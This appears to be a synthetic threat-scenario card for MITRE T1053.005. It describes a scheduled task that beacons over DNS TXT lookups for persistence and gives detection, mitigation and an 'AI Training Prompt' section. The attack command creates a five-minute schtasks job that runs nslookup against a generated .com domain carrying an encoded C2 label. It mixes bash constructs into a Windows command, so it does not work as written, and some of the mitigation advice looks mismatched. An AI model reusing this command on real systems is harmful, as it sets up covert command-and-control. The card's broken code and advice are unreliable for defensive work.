---
type: campaign
scenario_id: 483
tactic: Persistence
technique: "T1053.005: Scheduled Task/Job"
technique_id: T1053.005
tags: [campaign, lotl, persistence]
---

# Using schtasks to create a scheduled task for DNS tunneling persistence.

## Threat Description
Using schtasks to create a scheduled task for DNS tunneling persistence.

## Attack Command
```
schtasks /create /tn $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /tr "nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)" /sc minute /mo 5 /f
```

## Detection Logic
Monitor scheduled tasks: `schtasks /query | findstr nslookup`; Event ID 4698.

## Mitigation
Restrict schtasks: `icacls %windir%\System32\schtasks.exe /deny Everyone:RX`; Audit task creation: `auditpol /set /subcategory:'Security System Extension' /success:enable`.

## AI Training Prompt
Train AI to detect schtasks-based DNS tunneling persistence by analyzing nslookup TXT queries, scheduled task configurations, and DNS traffic patterns; suggest task restrictions.

## References
- MITRE ATT&CK T1053.005: https://attack.mitre.org/techniques/T1053/005/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
